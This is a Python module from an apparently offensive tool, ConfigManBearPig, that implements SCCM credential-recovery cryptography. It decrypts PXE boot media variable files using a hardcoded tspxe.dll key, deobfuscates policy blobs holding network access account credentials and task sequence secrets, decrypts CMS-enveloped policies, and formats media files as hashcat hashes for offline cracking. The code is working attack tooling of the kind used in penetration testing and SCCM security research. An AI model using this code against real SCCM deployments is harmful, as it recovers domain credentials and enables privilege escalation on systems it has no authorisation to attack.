"""
SCCM cryptographic operations for ConfigManBearPig.

Implements:
- PXE boot media variable file decryption (CRED-1, CRED-6, ELEVATE-5)
- SCCM policy secret deobfuscation (CRED-1, CRED-2)
- SCCM policy CMS envelope decryption (CRED-2)
- Key derivation matching CryptDeriveKey (tspxe.dll)

References:
- PXEThief: https://github.com/MWR-CyberSec/PXEThief
- pxethiefy: https://github.com/csandker/pxethiefy
- SCCMSecrets: https://github.com/synacktiv/SCCMSecrets
- sccmwtf: https://github.com/xpn/sccmwtf
"""

import logging
import math
import struct
from hashlib import sha1
from typing import Optional

from Crypto.Cipher import AES, DES3

logger = logging.getLogger("ConfigManBearPig")

# Hardcoded key from tspxe.dll — used to decrypt the blank-password key stream
# in the DHCP option 243 response when PXE media has no password set.
_TSPXE_HARDCODED_KEY = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'

# ------------------------------------------------------------------ #
#  Key Derivation (CryptDeriveKey)
# ------------------------------------------------------------------ #

def mscrypt_derive_key_sha1(secret: bytes) -> bytes:
    """
    Derive AES/3DES key material from a secret using the MS CryptDeriveKey
    algorithm with SHA-1 (matching tspxe.dll and SCCM policy obfuscation).

    The derivation follows HMAC-like ipad/opad XOR construction:
      buf1 = SHA1(secret) XOR 0x36 padded to 64 bytes
      buf2 = SHA1(secret) XOR 0x5C padded to 64 bytes
      key  = SHA1(buf1) || SHA1(buf2)   (40 bytes)

    Returns 40 bytes of key material. Callers slice as needed:
      AES-128: key[:16]
      3DES:    key[:24]
      AES-256: key[:32]
    """
    digest = sha1(secret).digest()

    buf1 = bytearray([0x36] * 64)
    buf2 = bytearray([0x5C] * 64)
    for i in range(len(digest)):
        buf1[i] ^= digest[i]
        buf2[i] ^= digest[i]

    return sha1(bytes(buf1)).digest() + sha1(bytes(buf2)).digest()


# ------------------------------------------------------------------ #
#  PXE Boot Media Variable File Operations
# ------------------------------------------------------------------ #

def read_media_variable_file_header(data: bytes) -> bytes:
    """
    Read the first 40 bytes of a media variable file (for hashcat hash).

    The header contains the salt and encrypted data needed to construct
    a hashcat hash: $sccm$aes128$<hex>
    """
    return data[:40]


def read_media_variable_file_body(data: bytes) -> bytes:
    """
    Read the encrypted body of a media variable file.

    Skips the 24-byte header and removes the 8-byte trailer.
    """
    return data[24:-8]


def decrypt_media_variable_file(data: bytes, password: bytes) -> Optional[str]:
    """
    Decrypt an SCCM PXE boot media variable file (.boot.var / Variables.dat).

    Args:
        data: Raw bytes of the media variable file
        password: Either UTF-16-LE encoded password string, or raw key bytes
                  from derive_blank_decryption_key()

    Returns:
        Decrypted XML string (UTF-16-LE decoded), or None on failure
    """
    try:
        encrypted_body = read_media_variable_file_body(data)
        key = mscrypt_derive_key_sha1(password)

        # AES-128-CBC with zero IV, decrypt only full 16-byte blocks
        last_16 = (len(encrypted_body) // 16) * 16
        aes = AES.new(key[:16], AES.MODE_CBC, b"\x00" * 16)
        decrypted = aes.decrypt(encrypted_body[:last_16])

        # Decode UTF-16-LE and strip trailing nulls
        text = decrypted.decode("utf-16-le")
        text = text[:text.rfind('\x00')]
        # Keep only printable characters
        text = "".join(c for c in text if c.isprintable())
        return text
    except Exception as e:
        logger.debug(f"Media variable file decryption failed: {e}")
        return None


def decrypt_media_variable_file_with_password(data: bytes, password: str) -> Optional[str]:
    """Decrypt a media variable file using a string password."""
    return decrypt_media_variable_file(data, password.encode("utf-16-le"))


def derive_blank_decryption_key(encrypted_key: bytes) -> Optional[bytes]:
    """
    Derive the decryption key for PXE media that has no password set.

    When the SCCM PXE media has a blank password, the DHCP response
    (option 243, packet_type=2) contains an encrypted key stream.
    This function decrypts that key stream using the hardcoded key
    from tspxe.dll to recover the actual media file decryption key.

    Args:
        encrypted_key: The encrypted key bytes from DHCP option 243

    Returns:
        20-byte key material for decrypt_media_variable_file(), or None
    """
    try:
        length = encrypted_key[0]
        encrypted_bytes = encrypted_key[1:1 + length]
        # Isolate the 16-byte encrypted data within the key blob
        encrypted_bytes = encrypted_bytes[20:-12]

        # Derive the key-decryption-key from the hardcoded tspxe.dll constant
        kdk = mscrypt_derive_key_sha1(_TSPXE_HARDCODED_KEY)
        aes = AES.new(kdk[:16], AES.MODE_CBC, b"\x00" * 16)
        var_file_key = aes.decrypt(encrypted_bytes[:16])[:10]

        # Expand each byte with a parity bit mask
        # If the high bit is set, append 0xFF; otherwise append 0x00
        new_key = bytearray()
        for byte_val in var_file_key:
            new_key.append(byte_val)
            if byte_val & 0x80:
                new_key.append(0xFF)
            else:
                new_key.append(0x00)

        return bytes(new_key)
    except Exception as e:
        logger.debug(f"Blank decryption key derivation failed: {e}")
        return None


def get_hashcat_hash(data: bytes) -> str:
    """
    Generate a hashcat-compatible hash from a media variable file.

    Use with the ConfigMgr CryptDeriveKey hashcat module:
    https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module

    Returns:
        Hash string in format: $sccm$aes128$<hex>
    """
    header = read_media_variable_file_header(data)
    return f"$sccm$aes128${header.hex()}"


# ------------------------------------------------------------------ #
#  SCCM Policy Secret Deobfuscation
# ------------------------------------------------------------------ #

def deobfuscate_secret_policy_blob(blob_hex: str) -> Optional[str]:
    """
    Deobfuscate an SCCM secret policy blob (NAA credentials, collection
    variables, task sequence secrets).

    The blob format:
      Bytes 0-1:   Magic prefix (0x8913 = 3DES, 0x8A13 = AES-256)
      Bytes 4-43:  Key material (40 bytes, SHA-1 input)
      Bytes 52-55: Data length (uint32 LE)
      Bytes 64+:   Encrypted data

    Credits: sccmwtf by @xpn, AES-256 support from impacket PR #2020

    Args:
        blob_hex: Hex-encoded obfuscated blob string

    Returns:
        Deobfuscated plaintext string, or None on failure
    """
    try:
        if isinstance(blob_hex, str):
            output = bytes.fromhex(blob_hex)
        else:
            output = blob_hex

        data_length = int.from_bytes(output[52:56], 'little')
        buffer = output[64:64 + data_length]

        key = mscrypt_derive_key_sha1(output[4:4 + 0x28])
        blob_prefix = output[:2]

        if blob_prefix == b'\x89\x13':
            # Triple DES
            logger.debug("Policy blob obfuscated with Triple DES")
            cipher = DES3.new(key[:24], DES3.MODE_CBC, b"\x00" * 8)
        elif blob_prefix == b'\x8a\x13':
            # AES-256
            logger.debug("Policy blob obfuscated with AES-256")
            cipher = AES.new(key[:32], AES.MODE_CBC, b"\x00" * 16)
        else:
            logger.warning(f"Unknown policy blob prefix: {blob_prefix.hex()}")
            return None

        decrypted = cipher.decrypt(buffer)

        # Remove PKCS7 padding
        if len(decrypted) > 0:
            pad_len = decrypted[-1]
            if 1 <= pad_len <= cipher.block_size:
                if all(b == pad_len for b in decrypted[-pad_len:]):
                    decrypted = decrypted[:-pad_len]

        try:
            return decrypted.decode('utf-16-le')
        except UnicodeDecodeError:
            return decrypted.hex()

    except Exception as e:
        logger.debug(f"Policy blob deobfuscation failed: {e}")
        return None


# ------------------------------------------------------------------ #
#  SCCM Policy CMS Envelope Decryption
# ------------------------------------------------------------------ #

def decrypt_cms_policy(policy_response: bytes, private_key) -> Optional[str]:
    """
    Decrypt a CMS-enveloped SCCM secret policy using the client's private key.

    SCCM encrypts secret policies using CMS (PKCS#7) EnvelopedData with:
    - RSA key encryption (PKCS1v15 or OAEP)
    - 3DES-CBC or AES-256-CBC body encryption

    Args:
        policy_response: Raw CMS/DER-encoded policy bytes
        private_key: RSA private key (cryptography library object)

    Returns:
        Decrypted policy XML string, or None on failure
    """
    try:
        from pyasn1.codec.der.decoder import decode
        from pyasn1_modules import rfc5652
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives.hashes import SHA1
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
    except ImportError as e:
        logger.warning(f"CMS decryption requires pyasn1/pyasn1-modules: {e}")
        return None

    OID_MAP = {
        '1.2.840.113549.3.7': 'des-ede3-cbc',
        '1.2.840.113549.1.1.1': 'rsaEncryption',
        '1.2.840.113549.1.1.7': 'id-RSAES-OAEP',
        '2.16.840.1.101.3.4.1.42': 'aes256_cbc',
    }

    try:
        content, _ = decode(policy_response, asn1Spec=rfc5652.ContentInfo())
        enveloped, _ = decode(content.getComponentByName('content'),
                              asn1Spec=rfc5652.EnvelopedData())

        encrypted_rsa_key = enveloped['recipientInfos'][0]['ktri']['encryptedKey'].asOctets()
        key_enc_oid = str(enveloped['recipientInfos'][0]['ktri']['keyEncryptionAlgorithm']['algorithm'])
        iv = enveloped['encryptedContentInfo']['contentEncryptionAlgorithm']['parameters'].asOctets()[2:]
        body = enveloped['encryptedContentInfo']['encryptedContent'].asOctets()
        body_enc_oid = str(enveloped['encryptedContentInfo']['contentEncryptionAlgorithm']['algorithm'])

        # Decrypt the symmetric key
        key_algo = OID_MAP.get(key_enc_oid)
        if key_algo == 'rsaEncryption':
            plaintext_key = private_key.decrypt(encrypted_rsa_key, padding.PKCS1v15())
        elif key_algo == 'id-RSAES-OAEP':
            plaintext_key = private_key.decrypt(
                encrypted_rsa_key,
                padding.OAEP(mgf=padding.MGF1(algorithm=SHA1()), algorithm=SHA1(), label=None)
            )
        else:
            logger.warning(f"Unsupported key encryption algorithm: {key_enc_oid}")
            return None

        # Decrypt the body
        body_algo = OID_MAP.get(body_enc_oid)
        if body_algo == 'des-ede3-cbc':
            try:
                from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
            except ImportError:
                TripleDES = algorithms.TripleDES
            cipher = Cipher(TripleDES(plaintext_key), modes.CBC(iv),
                            backend=default_backend())
        elif body_algo == 'aes256_cbc':
            cipher = Cipher(algorithms.AES(plaintext_key), modes.CBC(iv),
                            backend=default_backend())
        else:
            logger.warning(f"Unsupported body encryption algorithm: {body_enc_oid}")
            return None

        decryptor = cipher.decryptor()
        plaintext = decryptor.update(body) + decryptor.finalize()
        return plaintext.decode('utf-16le')

    except Exception as e:
        logger.debug(f"CMS policy decryption failed: {e}")
        return None
